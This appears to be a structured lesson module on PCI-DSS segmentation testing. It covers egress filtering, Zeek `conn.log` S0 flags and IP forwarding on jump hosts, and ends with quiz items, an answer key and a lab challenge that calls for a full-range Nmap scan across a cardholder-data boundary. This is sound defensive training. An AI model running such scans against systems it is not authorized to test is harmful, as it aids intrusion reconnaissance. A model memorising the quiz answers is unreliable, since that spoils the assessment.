Egress filtering audit transcript showing blocked vs allowed outbound destinations.
Zeek `conn.log` analysis documenting connection state history (`S0` vs `SF`).
lab.reset: Reset firewall rules, routing tables, and mock CDE test network fixtures to baseline.
lab.cleanup: Remove temporary test routing rules and clear Zeek network capture logs.

prevent: Mandate semi-annual penetration testing segmentation checks under PCI-DSS Requirement 11.3.4.
Disable IP forwarding (`net.ipv4.ip_forward = 0`) across all multi-homed jump hosts.
Enforce strict egress filtering blocking all outbound traffic except approved external API endpoints.
observe: Monitor firewall reject/drop logs for traffic attempts between isolated VLANs.
Analyze Zeek `conn.log` connection history flags (`S0` indicating connection attempts dropped by firewall).
Track network interface routing table changes on multihomed management servers.
respond: Immediately block any unapproved network port discovered open across a CDE boundary.
Disable IP forwarding on bridged hosts and reconfigure network interfaces into isolated segments.
Update formal PCI-DSS Scope reduction documentation following segmentation remediation.
residualRisk: Temporary management firewall rules opened during emergency troubleshooting may be left active permanently.
Software-defined networking (SDN) overlay bugs can cause intermittent cross-tenant packet leakage.

misconceptions.claim: VLAN tagging (802.1Q) alone without a firewall provides complete security segmentation.
misconceptions.correction: VLANs partition Layer 2 broadcast domains. If an upstream router or Layer 3 switch routes packets between the VLANs without firewall access control lists (ACLs), no security isolation exists.

misconceptions.claim: Segmentation testing only requires testing the top 10 common ports.
misconceptions.correction: PCI-DSS and security best practices require testing all 65,535 TCP ports and common UDP services to ensure no custom backdoors or administrative listeners bridge the boundary.

misconceptions.claim: Outbound egress filtering is optional if the inbound firewall is strong.
misconceptions.correction: Egress filtering is a critical defense-in-depth control that prevents compromised internal servers from establishing reverse shells, downloading malware, or exfiltrating stolen data.

quiz.question: Under PCI-DSS Requirement 11.3.4, what is the primary goal of penetration testing network segmentation?

options.label: To install cryptocurrency mining software on payment terminals.
To verify that the Cardholder Data Environment (CDE) is completely isolated from all out-of-scope corporate networks, with all unauthorized ingress/egress blocked.
To check if the company logo is displayed on the website.
To increase internet download speeds.

quiz.explanation: Segmentation testing validates that out-of-scope systems cannot communicate with the CDE, reducing compliance scope and preventing lateral compromise of payment data.

quiz.question: In Zeek (Bro) network connection logs (`conn.log`), what does the connection history flag `S0` signify?

options.label: Connection completed successfully with HTTP 200 OK.
Connection attempt seen (SYN packet sent), but no reply was returned (indicating the packet was dropped by a firewall or the host is offline).
The server was rebooted.
The connection used SSL version 0.

quiz.explanation: In Zeek telemetry, `S0` indicates an initial SYN was transmitted but no SYN-ACK or RST response was ever received, confirming firewall packet dropping.

quiz.question: What is the security risk of a multihomed jump host having `net.ipv4.ip_forward = 1` enabled in `/etc/sysctl.conf`?

options.label: The host automatically converts all IPv4 addresses into IPv6.

The Linux kernel acts as an active router, forwarding packets between its connected network interfaces and allowing corporate endpoints to bypass the perimeter firewall to access restricted internal subnets directly.
The host will refuse to boot.
All network traffic is encrypted twice.

quiz.explanation: Enabling IP forwarding instructs the kernel to route packets across its network interfaces, creating an unmonitored bridge that circumvents firewall segmentation.

transferChallenge.scenario: You are performing a mandatory PCI-DSS segmentation validation test between a Corporate Workstation network (10.0.0.0/24) and a Cardholder Data Environment (172.16.0.0/24). You must execute full-range port testing across the firewall boundary, audit outbound egress filtering from a CDE web server, analyze Zeek conn.log telemetry, and draft a formal Segmentation Compliance Report.
tasks: Execute an Nmap full-range TCP connect scan (`-p- -sT -Pn`) across the boundary into the CDE.
Test outbound egress from the CDE server to external test listeners across ports 21, 22, 53, 80, 443, 445, and 3389.
Analyze firewall and Zeek logs to verify connection drops and author the final Segmentation Assessment Report.
requiredEvidence: Boundary port scan execution transcript detailing open vs filtered ports.
Egress filtering test matrix documenting outbound connection results.
Formal PCI-DSS Segmentation Compliance Report with remediation recommendations.
